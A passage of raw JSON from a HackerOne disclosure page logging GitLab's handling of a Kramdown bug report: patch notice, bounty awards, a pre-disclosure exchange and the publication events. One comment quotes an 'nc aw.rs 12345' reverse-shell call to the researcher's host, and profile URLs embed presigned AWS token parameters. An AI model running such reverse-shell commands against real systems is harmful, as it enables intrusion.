l4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ddef48f431abeae9742636487401236aad1a7fd53802d5ea626345398e0002a9"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11034988,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @vakzz,\n\nThank you again for the excellent report as always! Your finding has been patched in GitLab version 13.9.4 and we are awarding a bounty. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nThe fix for this bug was a hot patch we made in Kramdown (and the actual upstream PR has been submitted in https://github.com/gettalong/kramdown/pull/708). As you are possibly aware, our policy mentions that we normally award 50% bounties for 3rd party bugs and we will do that here. However, given the huge impact of the bug, the fact that you did some extra work for the full exploitation and given that we will be following up the initial fix with some defense in depth changes we will award a bonus and bring the total to our normal maximum bounty of $20,000.\n\nThanks again and we look forward to your next report!\n\nAlso as a note for future readers of this report if it's disclosed, I mentioned that we were looking for signs of prior exploitation and the only thing found were from the reporter here and from members of our team reproducing the bug.\n\nBest regards,\nDominic\nGitLab Security Team","automated_response":false,"created_at":"2021-03-17T20:21:31.993Z","updated_at":"2021-03-17T20:21:31.993Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"vakzz","url":"/vakzz"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11034991,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2021-03-17T20:21:46.159Z","updated_at":"2021-03-17T20:21:46.159Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"GitLab"}},"bounty_amount":"9000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"vakzz","url":"/vakzz"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11034999,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2021-03-17T20:22:55.089Z","updated_at":"2021-03-17T20:22:55.089Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"GitLab"}},"bounty_amount":"0.0","bounty_currency":"usd","bonus_amount":"10000.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"vakzz","url":"/vakzz"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11420592,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-04-16T19:27:49.061Z","updated_at":"2021-04-16T19:27:49.061Z","first_to_agree":true,"actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132618Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ddef48f431abeae9742636487401236aad1a7fd53802d5ea626345398e0002a9"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11455493,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @vakzz,\n\nWe were reviewing the information before disclosure and we wanted to make sure that those `nc aw.rs 12345` calls listed in the `ps` output are yours and not something else. :)\n\nThanks,\nDominic\nGitLab Security Team","automated_response":false,"created_at":"2021-04-20T16:44:53.457Z","updated_at":"2021-04-20T16:44:53.457Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11455841,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @dcouture,\n\nYep `aw.rs` is my domain, so that would be from the reverse shell and will have exited when I ended the connection.\n\nCheers,\nWill","automated_response":false,"created_at":"2021-04-20T17:31:17.337Z","updated_at":"2021-04-20T17:31:17.337Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132618Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ddef48f431abeae9742636487401236aad1a7fd53802d5ea626345398e0002a9"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11455861,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-04-20T17:35:23.678Z","updated_at":"2021-04-20T17:35:23.678Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11455862,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-04-20T17:35:23.885Z","updated_at":"2021-04-20T17:35:23.885Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}